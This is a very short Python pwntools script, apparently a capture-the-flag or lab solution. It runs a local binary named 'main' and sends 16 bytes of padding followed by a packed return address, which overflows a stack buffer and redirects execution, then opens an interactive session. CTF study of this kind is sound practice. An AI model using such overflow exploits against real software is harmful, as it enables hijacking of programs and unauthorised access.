from pwn import *

target = process("main")
# buf = b'P'
buf = b'P'*16 + p32(0x080491be)
target.sendline(buf)
target.interactive()